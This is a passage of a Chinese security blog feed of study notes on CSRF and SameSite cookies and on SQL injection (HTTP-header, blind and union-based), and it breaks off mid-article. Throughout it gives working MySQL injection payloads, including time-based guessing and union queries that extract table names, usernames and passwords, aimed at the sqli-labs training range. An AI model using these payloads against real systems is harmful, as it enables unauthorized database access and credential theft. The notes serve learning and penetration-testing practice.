class="hljs-attribute">SameSite</span>=Strict;<br></code></pre></td></tr></table></figure><p>Strict是最严格的，它完全禁止在跨站情况下，发送Cookie。只有在自己的网站内部发送请求，才会带上Cookie。不过这个规则过于严格，会影响用户的体验。比如在一个网站中有一个链接，这个链接连接到了GitHub上，由于SameSite设置为Strict，跳转到GitHub后，GitHub总是未登录状态。</p><p>Lax的规则稍稍放宽了些，大部分跨站的请求也不会带上Cookie，但是一些导航的Get请求会带上Cookie，如下：</p><p>请求类型</p><p>示例</p><p>Lax情况</p><p>链接</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>发送 Cookie</p><p>预加载</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;link <span class="hljs-attribute">rel</span>=<span class="hljs-string">&quot;prerender&quot;</span> <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;...&quot;</span>/&gt;<br></code></pre></td></tr></table></figure><p>发送 Cookie</p><p>GET 表单</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">&lt;form <span class="hljs-function"><span class="hljs-keyword">method</span>=&quot;<span class="hljs-title">GET</span>&quot; <span class="hljs-title">action</span>=&quot;...&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>发送 Cookie</p><p>POST 表单</p><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">&lt;form <span class="hljs-function"><span class="hljs-keyword">method</span>=&quot;<span class="hljs-title">POST</span>&quot; <span class="hljs-title">action</span>=&quot;...&quot;&gt;</span><br></code></pre></td></tr></table></figure><p>不发送</p><p>iframe</p><p>frameLabelStart–frameLabelEnd</p><p>不发送</p><p>AJAX</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$.<span class="hljs-builtin-name">get</span>(<span class="hljs-string">&quot;...&quot;</span>)<br></code></pre></td></tr></table></figure><p>不发送</p><p>Image</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;img <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;...&quot;</span>&gt;<br></code></pre></td></tr></table></figure><p>不发送</p><p>上面的表格就是SameSite设置为Lax的时候，Cookie的发送情况。</p><p>None就是关闭SameSite属性，所有的情况下都发送Cookie。不过SameSite设置None，还要同时设置Cookie的Secure属性，否则是不生效的。</p><h2 id="3-常见问题"><a href="#3-常见问题" class="headerlink" title="3 常见问题"></a>3 常见问题</h2><ol><li>CSRF 与 SSRF 区别</li></ol><ul><li>CSRF (Cross-Site Request Forgery) 即跨站请求伪造，伪造用户请求，冒用用户身份。</li><li>SSRF (Server-Side Request Forgery) 即服务端请求伪造，就是伪造一个服务端请求，攻击者伪造服务端的请求发起攻击，攻击者借由服务端为跳板来攻击目标系统。</li></ul><p>用非常通俗的语言讲的话，CSRF 更像是钓鱼的举动，是用户攻击用户的；而对于 SSRF 来说，是由服务器发出请求，用户攻击服务器的。</p><ol start="2"><li>XSS 与 CSRF的区别</li></ol><p>XSS (Cross Site Scripting) 跨站脚本攻击 与 CSRF 的最大区别在于对 Cookie 的使用，XSS 把受害者 的 Cookie 偷过来，而 CSRF 则是借用了受害者的 Cookie。</p><ol start="3"><li>samesite防御CSRF的原理</li></ol><p>在原有的Cookie中，新添加了一个SameSite属性，它标识着在非同源的请求中，是否可以带上Cookie，它可以设置为3个值，分别为：Strict Lax None</p><ol start="4"><li>json格式的CSRF如何防御？</li></ol><p>前景知识：</p><p>json格式的CSRF存在的条件是POST 传参采用 JSON 格式，而不是传统的parameter=value的格式。一般采用 Json 格式传输参数时，请求包中都有 Content-Type 头，一般服务器也会验证 Content-Type 值是否为 application/json，当服务器验证 Content-Type 时，若不符合要求，则会抛出异常，导致传输的数据失效。</p><p>1）用户操作验证，在提交数据时需要输入验证码</p><p>2）请求来源验证，验证请求来源的referer</p><p>3）表单token验证</p><ol start="5"><li>什么是同源策略？</li></ol><p>同源策略由Netscape公司引入浏览器。目前，所有浏览器都实行这个策略。含义是指：A网页设置的Cookie，B网页不能打开，除非这两个网页“同源”。所谓同源指的是“三个相同”</p><ul><li>协议相同</li><li>域名相同</li><li>端口相同<h2 id="4-总结"><a href="#4-总结" class="headerlink" title="4 总结"></a>4 总结</h2>CSRF的关键字有：冒用用户身份凭证，前端same-site,后端token及refer检测防御。由于还在学习阶段，CSRF总结笔记后面再进行补充。<h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2></li></ul><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://xz.aliyun.com/t/7911">https://xz.aliyun.com/t/7911</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://cloud.tencent.com/developer/beta/article/1458194">https://cloud.tencent.com/developer/beta/article/1458194</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://mp.weixin.qq.com/s/XRqiLVdUzvzhD-bw2L3hhQ">https://mp.weixin.qq.com/s/XRqiLVdUzvzhD-bw2L3hhQ</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span>WEB常见漏洞之CSRF（靶场篇）<a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Sql注入】HTTP注入</title>
    <link href="/2023/04/26/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BHTTP%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/04/26/SQL%E6%B3%A8%E5%85%A5%E4%B9%8BHTTP%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>          </div><h2 id="1-HTTP注入"><a href="#1-HTTP注入" class="headerlink" title="1 HTTP注入"></a>1 HTTP注入</h2><p>Sql注入如果按数据提交方式进行分类，则有HTTP的<br>1）GET注入 2）POST注入 3）HEADER注入</p><h3 id="1-1-GET注入"><a href="#1-1-GET注入" class="headerlink" title="1.1 GET注入"></a>1.1 GET注入</h3><p>GET 的语义是从服务器获取指定的资源，这个资源可以是静态的文本、页面、图片视频等。GET 请求的参数位置一般是写在 URL 中。<br><a href="https://xiaolincoding.com/network/2_http/http_interview.html#get-%E4%B8%8E-post">https://xiaolincoding.com/network/2_http/http_interview.html#get-%E4%B8%8E-post</a><br>数据以get的方式进行提交，注入点一般在get提交的url的参数后，可以通过Burpsuite抓包进行查找。<a href="http://127.0.0.1/Less-1/?id=1">http://127.0.0.1/Less-1/?id=1</a> 类似这种可以输入不同id的均为Get请求。</p><h3 id="1-2-POST注入"><a href="#1-2-POST注入" class="headerlink" title="1.2 POST注入"></a>1.2 POST注入</h3><p>POST 的语义是根据请求负荷（报文body）对指定的资源做出处理，具体的处理方式视资源类型而不同。POST 请求携带数据的位置一般是写在报文 body 中。比如，你在我文章底部，敲入了留言后点击「提交」，浏览器就会执行一次 POST 请求，把你的留言文字放进了报文 body 里，然后拼接好 POST 请求头，通过 TCP 协议发送给服务器。<br>数据以post的方式进行提交。注入点一般在表单的填写处。</p><p>图片</p><p>如sqli-lab Less-14</p><h3 id="1-3-Http头部注入"><a href="#1-3-Http头部注入" class="headerlink" title="1.3 Http头部注入"></a>1.3 Http头部注入</h3><p>user-agent：判定用户使用的操作系统，以及使用的浏览器的版本</p><p>cookie：判定用户的身份，进行session跟踪可以存储在用户本地终端上的数据，简单理解为用户的一张身份辨别卡</p><p>x-forwarded-for：获得HTTP请求端真实的IP</p><p>client-ip：数据库保存客户端IP的参数</p><p>rerferer：浏览器向web端表明自己从哪个链接而来</p><p>host：客户端指定自己想访问的WEB服务器的域名/IP 地址和端口号</p><h2 id="2-靶场例子或测试步骤"><a href="#2-靶场例子或测试步骤" class="headerlink" title="2 靶场例子或测试步骤"></a>2 靶场例子或测试步骤</h2><p>① POST包中header的User-agent头后拼接语句<br>图片</p><p>‘and extractvalue(1,concat(0x7e,version(),0x7e)) and ‘1’=’1</p><p>‘or extractvalue(1,concat(0x7e,(select username from security.users limit 0,1),0x7e)) or’</p><p>② cookie后拼接语句</p><p>图片</p><p>图片</p><p>图片</p><p>③ x-forwarded-for后拼接语句</p><p>X-forwarded-for:172.63.25.3’ and updatexml(1,concat(0x7e,(selectdatabase()),0x7e),1) and ‘1’=’1  </p><p>④ client-ip/rerferer都和前面的类似</p><p>referer:xxx.com’ and extractvalue(1,concat(0x7e,(select database()),0x7e)) and ‘1’=’1</p><p>⑤ host注入</p><p>1）修改Host值</p><p>简单地来说，可以修改HTTP头中的Host值，如果观察到响应包中含有修改后的值，说明存在漏洞。但有时候篡改Host头的值会导致无法访问Web应用程序，从而导致“无效主机头”的错误信息，特别是通过CDN访问目标时会发生这种情况。</p><p>2）添加重复的Host头</p><p>添加重复的Host头，通常两个Host头之中有一个是有效的，可以理解为一个是确保请求正确地发送到目标服务器上；另一个则是传递payload到后端服务器中。</p><p>GET /example HTTP/1.1<br>Host: vulnerable-website.com<br>Host: attackd-stuff<br>3）使用绝对路径的URL</p><p>尽管许多请求通常在请求域上使用相对路径，但是也同时配置了绝对URL的请求。</p><p>GET <a href="https://vulnerable-website.com/">https://vulnerable-website.com/</a> HTTP/1.1<br>Host: attack-stuff<br>有时候也可以尝试不同的协议，如HTTP或HTTPS。</p><p>4）添加缩进或换行</p><p>当一些站点block带有多个Host头的请求时，可以通过添加缩进字符的HTTP头来绕过：</p><p>GET /example HTTP/1.1<br> Host: attack-stuff<br>Host: vulnerable-website.com<br>5）注入覆盖Host头的字段</p><p>与Host头功能相近的字段，如X-Forwarded-Host、X-Forwarded-For等，这些有时候是默认开启的。</p><p>GET /example HTTP/1.1<br>Host: vulnerable-website.com<br>X-Forwarded-Host: attack-stuff<br>诸如此类，还有其他的字段：</p><p>X-Host<br>X-Forwarded-Server<br>X-HTTP-Host-Override<br>Forwarded<br>6）忽略端口仅校验域名</p><p>当修改、添加重复Host头被拦截的时候，可以尝试了解Web应用程序是怎样解析Host头的。</p><p>比如，一些解析算法会忽略Host头中的端口值，仅仅校验域名。这时候可以将Host修改为如下形式：</p><p>GET /example HTTP/1.1<br>Host: vulnerable-website.com:attack-stuff<br>保持域名不变，修改端口值为非端口号的其他值（非数字）， 将Host头攻击的payload放在端口值处，同样能进行Host头攻击。</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h2><p>本篇我们讲解了sql注入漏洞的HTTP注入，HTTP注入的关键词有：1）GET注入 2）POST注入 3）HEADER注入。文章重点在于HTTP头部注入部分，http头部有许多不同的字段，这些字段标识了不同的信息，其中host字段注入介绍了许多细节。<br>学习到这里，我们已经积攒了一定的问题，比如这些sql注入有哪些修复建议，有没有统一的测试步骤等，我们在后面的文章中一一寻找答案并解决吧。同时我们将讲完接下来的堆叠注入，二次注入，宽字节注入。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://blog.csdn.net/qq_39654116/article/details/105421499">https://blog.csdn.net/qq_39654116/article/details/105421499</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="https://blog.csdn.net/angry_program/article/details/109034421">https://blog.csdn.net/angry_program/article/details/109034421</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Sql注入】盲注</title>
    <link href="/2023/04/25/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/"/>
    <url>/2023/04/25/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E7%9B%B2%E6%B3%A8/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>          </div><h2 id="1-盲注"><a href="#1-盲注" class="headerlink" title="1 盲注"></a>1 盲注</h2><p>为什么叫做盲注？<br>盲注的本质是猜解(所谓 “盲” 就是在你看不到返回数据的情况下能通过 “感觉” 来判断)，那能感觉到什么？答案是：差异（包括运行时间的差异和页面返回结果的差异）。</p><p>也就是说我们想实现的是我们要构造一条语句来测试我们输入的布尔表达式，使得布尔表达式结果的真假直接影响整条语句的执行结果，从而使得系统有不同的反应，在时间盲注中是不同的返回的时间，在布尔盲注中则是不同的页面反应。</p><p>如上所述，这种猜测的过程使得盲注得名。在盲注中，攻击者根据页面内容的不同，或是响应时间不同来判断是否存在注入，以及注入是否成功。<br>于是很好理解，盲注是页面无数据库回显示，但能通过 1）反应时间或 2）页面不同的差异，来反馈逻辑正误的注入。攻击者可以利用逻辑判断获取数据库中的数据。常见的可以分为布尔盲注和时间盲注两大类。<br><img src="/img/blind_1.png"><br>这种类似if的逻辑语句可以给sql语句分流，出现两种结果，带来差异。我们把这种能根据其中输入真假，返回不同结果的函数叫做分流函数。其他的分流“函数”还有：elt()， field()，case when then else end等等。</p><ol><li><p>ELT(N ,str1 ,str2 ,str3 ,…)<br>说明：若 N = 1 ，则返回值为 str1 ，若 N = 2 ，则返回值为 str2 ，以此类推。若 N 小于 1 或大于参数的数目，则返回值为 NULL 。ELT() 是 FIELD() 的补数。</p></li><li><p>FIELD(str, str1, str2, str3, ……)<br>该函数返回的是 str 在这些字符串的位置的索引，如果找不到返回 0。</p></li><li><p>case when then else end</p><p>  CASE WHEN (ascii(substr((select database()),{0},1))&gt;{1}) THEN 1 ELSE (SELECT 1 FROM DUAL UNION SELECT 2 FROM DUAL) END)</p><h3 id="1-1-布尔盲注"><a href="#1-1-布尔盲注" class="headerlink" title="1.1 布尔盲注"></a>1.1 布尔盲注</h3><p>布尔盲注：某些场合下，不能返回查询的结果，但是对于输入 布尔值 0 和 1 的反应是不同的。通过输入布尔值的注入点，注入我们的条件语句，查看页面的返回结果（True or False）来判断哪些SQL判断条件成立，通过此来获取数据库中的数据。<br>① 布尔盲注的特点：<br>1）只会显示执行或者未执行两种不同界面</p></li></ol><p>2）适用于数据库能查询到数据和查询不到数据页面返回不同，但是数据不会显示在页面</p><p>② 注入流程及手段<br>参考论坛@士别三日wyx的帖子，我们以sqli-lab Less 5为例，?id=1 正常输入页面显示 “You are in…”， 加入单引号发现报错。</p><p><img src="/img/blind_2.png"></p><p><a href="http://127.0.0.1/Less-5/?id=1&#39;and">http://127.0.0.1/Less-5/?id=1&#39;and</a> length(database())=1 –+<br><img src="/img/blind_3.png"><br>此时，页面回显为空。猜数据库长度(利用二分法)。<br><a href="http://127.0.0.1/Less-5/?id=1&#39;and">http://127.0.0.1/Less-5/?id=1&#39;and</a> length(database())=8 –+<br><img src="/img/blind_4.png"><br>当页面回显You are in … 说明and后面数值为1， 显示正常，说明数据库名长度为8。这种通过构造条件判断的方式进行猜解的过程，即是盲注的过程。</p><h3 id="1-2-时间盲注（延迟注入）"><a href="#1-2-时间盲注（延迟注入）" class="headerlink" title="1.2 时间盲注（延迟注入）"></a>1.2 时间盲注（延迟注入）</h3><p> 时间盲注：根据页面的响应时间来判断是否存在注入。一般通过延迟函数，大量查询等payload进行利用。时间盲注使用的优先级并不高，通常是在联合注入、报错注入、布尔盲注都无法使用时才会考虑使用：</p><p>1）页面没有回显位置（联合注入无法使用）</p><p>2）页面不显示数据库的报错信息（报错注入无法使用）</p><p>3）无论成功还是失败，页面只响应一种结果（布尔盲注无法使用）</p><p>①  延迟函数 sleep(n) 、benchmark(n,expr)<br>sleep：</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs axapta"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id = <span class="hljs-string">&#x27;1&#x27;</span> and sleep(<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>benchmark：benchmark(10000000,encode(‘hello’,’mom’))</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">eg.  <span class="hljs-function"><span class="hljs-keyword">select</span> <span class="hljs-title">BENCHMARK</span>(<span class="hljs-params"><span class="hljs-number">10000</span>,md5(<span class="hljs-string">&#x27;a&#x27;</span></span>))</span>;<br></code></pre></td></tr></table></figure><p>benchmark是Mysql的一个内置函数,其作用是来测试一些函数的执行速度。benchmark()中带有两个参数，第一个是执行的次数，第二个是要执行的函数或者是表达式</p><p>② heavy query<br>heavy query顾名思义就是通过做大量的查询导致查询时间较长来达到延时的目的。通常选择一些比较大的表做笛卡尔积运算。</p><p>③ get_lock<br>get_lock()函数 需要使用 mysql_pconnect函数来连接数据库，利用场景比较有限。</p><p>在一个session中可以先锁定一个变量例如：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada"><span class="hljs-keyword">select</span> get_lock(‘MountSec’,<span class="hljs-number">1</span>)。<br></code></pre></td></tr></table></figure><p>然后通过另一个session再次执行get_lock（‘MountSec’,5）此时会产生5秒的延迟，其效果类似于sleep(5)。<br>④ rpad+rlike<br>rpad(1,3,’a’)是指用a填充第一位的字符串以达到第二位的长度</p><p>经本地测试mysql5.7最大允许用单个rpad()填充349525位，而多个rpad()可以填充4个349525位，</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> table1 <span class="hljs-keyword">where</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <span class="hljs-built_in">and</span> <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">mid</span>(user(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-comment">&#x27;r&#x27;,concat(rpad(1,349525,&#x27;a&#x27;),</span><br>rpad(<span class="hljs-number">1</span>,<span class="hljs-number">349525</span>,<span class="hljs-comment">&#x27;a&#x27;),rpad(1,349525,&#x27;a&#x27;)) </span><br>RLIKE <span class="hljs-comment">&#x27;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+</span><br>asdasdsadasd<span class="hljs-comment">&#x27;,1);</span><br></code></pre></td></tr></table></figure><p>最后的asdasdasd对时间长度有巨大影响，可以增长其长度以增大时延</p><h2 id="2-常见payload"><a href="#2-常见payload" class="headerlink" title="2 常见payload"></a>2 常见payload</h2><h3 id="2-1-猜解细节"><a href="#2-1-猜解细节" class="headerlink" title="2.1 猜解细节"></a>2.1 猜解细节</h3><p>①  猜解当前数据库名称长度（二分法）</p><pre><code class="hljs"> &#39; and if((length(database()))=12,sleep(5),1)--+ 页面延时了</code></pre><p>==》当前数据库名称长度为 12。</p><p>② 猜解当前数据库名称<br>猜解数据库第一个字符</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript">?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>((ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)) =<span class="hljs-number">115</span> ),sleep(<span class="hljs-number">3</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>猜解整个数据库名</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">&#x27; and <span class="hljs-keyword">if</span>(ascii(<span class="hljs-built_in">substr</span>(database(),1,1))=107,<span class="hljs-keyword">sleep</span>(5),1)--+ <br></code></pre></td></tr></table></figure><p>页面延时了<br>==》数据库第一个字母是k… 类推得到数据库名kanwolonxia。可以用burp进行爆破。</p><h3 id="2-2-常用语句"><a href="#2-2-常用语句" class="headerlink" title="2.2 常用语句"></a>2.2 常用语句</h3><p>①  条件语句case when then else end</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">&quot;(CASE WHEN (ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>()),&#123;<span class="hljs-number">0</span>&#125;,<span class="hljs-number">1</span>))&gt;&#123;<span class="hljs-number">1</span>&#125;) <span class="hljs-keyword">THEN</span> <span class="hljs-number">1</span> <span class="hljs-keyword">ELSE</span> (<span class="hljs-keyword">SELECT</span> <span class="hljs-number">1</span> <span class="hljs-keyword">FROM</span> DUAL <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> <span class="hljs-number">2</span> <span class="hljs-keyword">FROM</span> DUAL) <span class="hljs-keyword">END</span>)<span class="hljs-string">&quot;.format(i, str(ord(string[left])))</span><br></code></pre></td></tr></table></figure><p>②  条件语句 if(expr1,expr2,expr3)<br>expr1为true则返回expr2，expr1为false则返回expr3。</p><p>注：仅MySQL支持if（expr1，expr2，expr3）</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27;and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">97</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)# 明显延迟<br><span class="hljs-attribute">1</span>&#x27;and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&lt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)# 没有延迟<br><span class="hljs-attribute">1</span>&#x27;and if(ascii(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">100</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)# 没有延迟<br></code></pre></td></tr></table></figure><p>③ Order by<br>order by rand(True)和order by rand(False)的结果排序是不同的，可以根据这个不同来进行盲注：order by rand(database()=’MountSec’)</p><p>返回了True的排序，说明database()=’MountSec’是正确的值</p><h2 id="3-总结"><a href="#3-总结" class="headerlink" title="3 总结"></a>3 总结</h2><p>本篇我们讲解了sql注入漏洞的盲注，盲注的关键词有：1）页面无数据库回显示，2）时间盲注：反应时间差异 ，3）布尔盲注：页面差异。</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.sqlinjection.net/heavy-query/">https://www.sqlinjection.net/heavy-query/</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="http://zhuanzhuan.lklgongyi.com/anquanke/26/170626.html">http://zhuanzhuan.lklgongyi.com/anquanke/26/170626.html</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.freebuf.com/articles/web/356765.html">https://www.freebuf.com/articles/web/356765.html</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>渗透测试</category>
      
    </categories>
    
    
    <tags>
      
      <tag>渗透测试，SQL注入</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【Sql注入】联合注入</title>
    <link href="/2023/04/24/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/"/>
    <url>/2023/04/24/SQL%E6%B3%A8%E5%85%A5%E4%B9%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<div class="note note-info">            <p>本Web安全基础推文系列旨在以平白的语言讲解漏洞原理，文章多数内容为我本人的学习笔记与总结，汇总供大家参考。</p>          </div><h1 id="联合注入：基于Union的注入"><a href="#联合注入：基于Union的注入" class="headerlink" title="联合注入：基于Union的注入"></a>联合注入：基于Union的注入</h1><h2 id="sql注入漏洞概述"><a href="#sql注入漏洞概述" class="headerlink" title="sql注入漏洞概述"></a>sql注入漏洞概述</h2><p>本篇我们即将开启Web安全基础学习之旅，从我所整理的笔记中梳理常见Web漏洞的诸多知识点，包括漏洞原理，分类，利用场景及手段，渗透测试步骤，防御措施及常用工具等多个角度。</p><p>首先，sql注入原理：存在输入口，使得用户输入的恶意sql语句拼接到正常语句中被后台执行。</p><h2 id="1-联合注入-基于Union的注入"><a href="#1-联合注入-基于Union的注入" class="headerlink" title="1 联合注入(基于Union的注入)"></a>1 联合注入(基于Union的注入)</h2><p>上一篇我们已经总结了报错注入的知识点，报错注入是注入页面可显示数据库报错结果的情况下，利用函数报错使其输出错误结果来获取数据库的相关信息的一种sql注入类型。其可以分为数据溢出报错(exp,~)，xpath语法报错(extractvalue/updatexml)，主键重复报错（count()、rand()、group by组合），列名重复报错（NAME_CONST/const/join），几何函数报错。</p><p>本篇我们集中介绍联合注入，即基于Union的注入。</p><p>select username from user union select userid from user;<br>大致就是这样，显然union会一次显示两个查询结果<br>Union注入可利用的前提是页面上有显示位。服务端执行SQL语句查询数据库中的数据，客户端将数据展示在页面中，当页面对不同的查询语句有不同的结果时可以使用。</p><h2 id="2-注入步骤及漏洞利用"><a href="#2-注入步骤及漏洞利用" class="headerlink" title="2 注入步骤及漏洞利用"></a>2 注入步骤及漏洞利用</h2><p>① 找注入点<br>如果要对一个网站进行SQL注入攻击，首先就需要找到存在SQL注入漏洞的地方，也就是寻找所谓的注入点。可能的SQL注入点一般存在于登录页面、查找页面或添加页面等用户可以查找或修改数据的地方，如表单中的输入域 URL的参数 Cookie或者隐藏域。<br>可能的注入点细节我们后面慢慢整理与补充。<br>　　最常用的寻找SQL注入点的方法，是在网站中寻找如下形式的页面链接：<a href="http://www.xxx.com/xxx.asp?id=YY">http://www.xxx.com/xxx.asp?id=YY</a>     (此处参数存在的文件后缀可为.asp/php/html/…)。其中“YY”可能是数字，也有可能是字符串，分别被称为整数类型数据或者字符型数据。<br>Tips: 那么我们如何快速查找某个网站存在的sql注入点呢？此处挖坑。<br>② 判断注入类型</p><p>我们在可能存在SQL注入变量的后边添加以下payload：</p><p>and 1=1 / and 1=2 回显页面不同(数字型判断) </p><p>单引号‘  双引号” 判断 显示数据库错误信息或者页面回显不同(字符串类型判断) </p><p>-1/+1 回显下一个或上一个页面(数字型判断)</p><p>③ 判断查询列数<br>猜解列数：order by 函数是对MySQL中查询结果按照指定字段名进行排序，除了指定字 段名还可以指定字段的栏位进行排序。<br><img src="/img/col_guess.png"><br>第一个查询字段为1，第二个为2，依次 类推。我们可以通过二分法来猜解列数。输入 order by 4%23  发现页面错误，说明没有4列。输入3列时，页面正常，说明有3列。<br>④  判断显示位<br>‘ union select 1 –+<br>‘ union select 1,2 –+<br>‘ union select 1,2,3 –+<br>这一步的作用是：判断显示位，因为我们不知道显示位是在1，2还是3<br><img src="/img/place_guess.png"><br>UNION的作用是将两个select查询结果合并。union左边的select子句查询结果为空，那么union右边的查询结果自然就成为了第一行，打印在网页上了。于是我们可以设置id=-1 使得union后边显示出来。<br>即：?id=-1’ union select 1,2,3–+<br>⑤ 获取所有数据库名<br>获得当前数据库及用户信息：<br>‘ union select 1,version(), database() –<br>‘ union select 1,user(), database() –<br>version() 获得数据库版本信息，database() 获得当前数据库名，user() 获得当前用户名。<br>此时这些信息会显示到界面。</p><p>⑥ 获取表名<br>查询数据库中的所有表：<br>‘ union select * from information_schema.tables –+<br>查询所有库名：<br>‘ union select table_schema, 1 from information_schema.tables –+<br>查询数据库中的所有表名：<br>‘union select table_name, 1 from information_schema.tables –+<br>同时查询表名及对应库名：<br>‘ union select table_name, table_schema from information_schema.tables –+<br>查询数据表中的列名：<br>‘union select column_name, 1 from information_schema.columns<br>where table_name = ‘users’ –+<br>查询数据列：’ union select 1, user from users –+<br>?id=-1′ union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=’security’),3–+<br>?id=-1′ union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=’security’and table_name=’users’),3–+<br>?id=-1′ union select 1,(select concat_ws(char(32,58,32),username,password) from users limit 1,1),3–+<br>?id=0’ union select 1,username,password from users limit 1,1–+<br>使用limit控制，一行行获取数据<br> select * from tableName limit i,n<br> tableName：表名<br> i：为查询结果的索引值(默认从0开始)，当i=0时可省略i<br> 